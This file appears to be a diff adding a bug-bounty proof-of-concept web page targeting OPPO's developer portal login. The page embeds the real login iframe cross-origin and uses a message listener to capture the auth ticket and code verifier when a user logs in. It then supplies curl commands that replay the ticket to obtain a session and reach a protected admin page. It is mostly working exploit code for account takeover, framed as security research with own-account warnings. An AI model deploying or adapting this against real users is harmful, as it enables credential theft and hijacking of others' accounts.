@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OPPO SSO — postMessage Token Leakage PoC | nader-lupin</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', system-ui, monospace; min-height: 100vh; padding: 24px; }
+    .header { border-bottom: 1px solid #30363d; padding-bottom: 16px; margin-bottom: 24px; }
+    .header h1 { font-size: 1.1rem; color: #f78166; letter-spacing: 0.02em; }
+    .header .meta { font-size: 0.78rem; color: #6e7681; margin-top: 4px; }
+    .warning-banner { background: #1f0a0a; border: 1px solid #f78166; border-radius: 6px; padding: 10px 16px; font-size: 0.82rem; color: #f78166; margin-bottom: 24px; }
+    .layout { display: grid; grid-template-columns: 640px 1fr; gap: 24px; align-items: start; }
+    .panel-label { font-size: 0.72rem; color: #6e7681; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px; }
+    .iframe-wrapper { border: 1px solid #30363d; border-radius: 8px; overflow: hidden; background: #161b22; }
+    .iframe-header { background: #161b22; padding: 8px 12px; font-size: 0.75rem; color: #8b949e; border-bottom: 1px solid #30363d; display: flex; align-items: center; gap: 8px; }
+    .iframe-header .dot { width: 10px; height: 10px; border-radius: 50%; }
+    .dot-r { background: #f78166; } .dot-y { background: #e3b341; } .dot-g { background: #3fb950; }
+    .iframe-header .url-bar { background: #0d1117; border-radius: 4px; padding: 2px 8px; font-size: 0.72rem; color: #58a6ff; flex: 1; }
+    iframe#oppo-frame { width: 640px; height: 660px; display: block; border: none; }
+    .right-panel { display: flex; flex-direction: column; gap: 20px; }
+    .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; overflow: hidden; }
+    .card-header { background: #1c2128; padding: 8px 14px; font-size: 0.78rem; color: #8b949e; border-bottom: 1px solid #30363d; display: flex; justify-content: space-between; align-items: center; }
+    .card-header .badge { font-size: 0.68rem; padding: 2px 7px; border-radius: 10px; }
+    .badge-waiting { background: #272d3b; color: #6e7681; } .badge-live { background: #0f2d14; color: #3fb950; } .badge-hit { background: #3d0d0d; color: #f78166; }
+    #log-box { padding: 10px 14px; height: 200px; overflow-y: auto; font-size: 0.75rem; line-height: 1.7; }
+    #log-box .ts { color: #484f58; } #log-box .info { color: #58a6ff; } #log-box .ok { color: #3fb950; } #log-box .warn { color: #e3b341; } #log-box .crit { color: #f78166; font-weight: 600; }
+    pre#token-out { padding: 14px; font-size: 0.76rem; color: #d2a8ff; white-space: pre-wrap; word-break: break-all; min-height: 80px; max-height: 280px; overflow-y: auto; }
+    .actions { padding: 10px 14px; border-top: 1px solid #30363d; display: flex; gap: 8px; }
+    button { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; border-radius: 6px; padding: 5px 14px; font-size: 0.78rem; cursor: pointer; font-family: inherit; }
+    button:hover { background: #30363d; } button.primary { background: #238636; border-color: #2ea043; color: #fff; } button.primary:hover { background: #2ea043; }
+    .vuln-list { padding: 14px; } .vuln-list li { font-size: 0.78rem; color: #8b949e; line-height: 1.8; padding-left: 12px; position: relative; }
+    .vuln-list li::before { content: '▸'; position: absolute; left: 0; color: #388bfd; } .vuln-list li strong { color: #f78166; }
+    .curl-block { padding: 14px; font-size: 0.73rem; color: #79c0ff; line-height: 1.8; word-break: break-all; }
+    code { color: #d2a8ff; background: #1c2128; padding: 1px 4px; border-radius: 3px; }
+    .footer { margin-top: 32px; padding-top: 16px; border-top: 1px solid #21262d; font-size: 0.72rem; color: #484f58; }
+  </style>
+</head>
+<body>
+<div class="header">
+  <h1>OPPO Developer Portal — postMessage Auth Token Leakage PoC</h1>
+  <div class="meta">Researcher: nader-lupin &nbsp;|&nbsp; Target: developers.oppomobile.com &nbsp;|&nbsp; PoC: lupin-sudo.github.io/oppo-poc &nbsp;|&nbsp; CWE-346 / CWE-1021 &nbsp;|&nbsp; Severity: Critical</div>
+</div>
+<div class="warning-banner">⚠&nbsp; SECURITY RESEARCH ONLY — BUG BOUNTY POC — TEST WITH YOUR OWN ACCOUNT ONLY — DELETE ALL TOKENS IMMEDIATELY AFTER</div>
+<div class="layout">
+  <div>
+    <div class="panel-label">OPPO Login Iframe — loaded cross-origin from developers.oppomobile.com</div>
+    <div class="iframe-wrapper">
+      <div class="iframe-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="url-bar">developers.oppomobile.com/user/web-sso/login-iframe</span></div>
+      <iframe id="oppo-frame" src="https://developers.oppomobile.com/user/web-sso/login-iframe?fromLocation=https://lupin-sudo.github.io/oppo-poc/"></iframe>
+    </div>
+    <div style="font-size:0.72rem; color:#484f58; margin-top:6px;">Log in above with your own OPPO test account to trigger the postMessage.</div>
+  </div>
+  <div class="right-panel">
+    <div class="card">
+      <div class="card-header">Vulnerability Chain <span class="badge badge-hit">Critical</span></div>
+      <ul class="vuln-list">
+        <li><strong>[1]</strong> No <code>X-Frame-Options</code> on login-iframe → embeddable cross-origin</li>
+        <li><strong>[2]</strong> <code>postMessage({...ticket}, "*")</code> → credential delivered to any parent</li>
+        <li><strong>[3]</strong> Ticket replay via <code>POST /user/web-sso/set-cookie</code> → ATO</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="card-header">postMessage Event Log <span class="badge badge-waiting" id="status-badge">waiting</span></div>
+      <div id="log-box"><span class="ts">[init] </span><span class="info">Listener active. Waiting for OPPO iframe postMessage…</span></div>
+    </div>
+    <div class="card">
+      <div class="card-header">Captured Auth Token (raw postMessage payload) <span class="badge badge-waiting" id="token-badge">empty</span></div>
+      <pre id="token-out">No token captured yet. Log in above with your test account.</pre>
+      <div class="actions"><button class="primary" id="copy-btn" onclick="copyToken()">Copy Token JSON</button><button onclick="clearAll()">Clear</button></div>
+    </div>
+    <div class="card">
+      <div class="card-header">Session Replay — Step 3 (curl)</div>
+      <div class="curl-block">
+        # Replace TICKET_VALUE with the ticket field from the captured JSON above<br><br>
+        curl -i -X POST \<br>
+        &nbsp;&nbsp;"https://developers.oppomobile.com/user/web-sso/set-cookie" \<br>
+        &nbsp;&nbsp;-H "Content-Type: application/x-www-form-urlencoded" \<br>
+        &nbsp;&nbsp;-H "X-HackerOne-Research: nader-lupin" \<br>
+        &nbsp;&nbsp;--data-urlencode "ticket=TICKET_VALUE" \<br>
+        &nbsp;&nbsp;-c /tmp/oppo_session.txt<br><br>
+        # Verify access to protected resource with the replayed session<br>
+        curl -i \<br>
+        &nbsp;&nbsp;"https://developers.oppomobile.com/user/admin/qualification" \<br>
+        &nbsp;&nbsp;-H "X-HackerOne-Research: nader-lupin" \<br>
+        &nbsp;&nbsp;-b /tmp/oppo_session.txt
+      </div>
+    </div>
+  </div>
+</div>
+<div class="footer">PoC hosted at https://lupin-sudo.github.io/oppo-poc/ &nbsp;|&nbsp; For: HackerOne Bug Bounty — OPPO Developer Program &nbsp;|&nbsp; Do not distribute. Delete all captured tokens immediately after testing.</div>
+<script>
+  let capturedData = null;
+  const logBox = document.getElementById('log-box');
+  const tokenOut = document.getElementById('token-out');
+  const statusBadge = document.getElementById('status-badge');
+  const tokenBadge = document.getElementById('token-badge');
+  function log(cls, msg) {
+    const ts = new Date().toISOString().replace('T', ' ').slice(0, 23);
+    const line = document.createElement('div');
+    line.innerHTML = `<span class="ts">[${ts}] </span><span class="${cls}">${msg}</span>`;
+    logBox.appendChild(line);
+    logBox.scrollTop = logBox.scrollHeight;
+  }
+  window.addEventListener('message', function(event) {
+    log('info', `postMessage received &nbsp;| origin: <code>${event.origin}</code>`);
+    if (!event.data || typeof event.data !== 'object') { log('warn', 'Non-object message — skipping.'); return; }
+    const channel = event.data.channel;
+    log('info', `channel: <code>${channel || '(none)'}</code>`);
+    if (channel !== 'sdk-login-status') return;
+    const payload = event.data.data;
+    const code = payload && payload.code;
+    statusBadge.className = 'badge badge-live';
+    statusBadge.textContent = 'active';
+    if (code === 'cancelSuccess') { log('warn', 'Login cancelled by user.'); return; }
+    if (code === 'loginSuccess') {
+      capturedData = payload;
+      log('crit', '&gt;&gt;&gt; LOGIN SUCCESS — auth token captured! &lt;&lt;&lt;');
+      const ticket = payload.ticket || payload.accessToken || '(inspect JSON)';
+      const codeVerifier = payload.codeVerifier || '(not present)';
+      log('crit', `ticket &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; → ${String(ticket).substring(0, 72)}…`);
+      log('ok',   `codeVerifier → ${String(codeVerifier).substring(0, 72)}`);
+      log('info', 'Use the curl block below to replay this ticket.');
+      tokenOut.textContent = JSON.stringify(payload, null, 2);
+      tokenBadge.className = 'badge badge-hit';
+      tokenBadge.textContent = 'captured';
+      statusBadge.className = 'badge badge-hit';
+      statusBadge.textContent = 'token captured';
+    }
+  });
+  function copyToken() {
+    if (!capturedData) { alert('No token captured yet — complete login first.'); return; }
+    navigator.clipboard.writeText(JSON.stringify(capturedData, null, 2))
+      .then(() => log('ok', 'Token JSON copied to clipboard.'))
+      .catch(() => log('warn', 'Clipboard unavailable — copy from the pre block manually.'));
+  }
+  function clearAll() {
+    capturedData = null;
+    tokenOut.textContent = 'Cleared.';
+    tokenBadge.className = 'badge badge-waiting';
+    tokenBadge.textContent = 'empty';
+    statusBadge.className = 'badge badge-waiting';
+    statusBadge.textContent = 'waiting';
+    log('warn', 'Capture cleared. All local token data wiped.');
+  }
+</script>
+</body>
+</html>
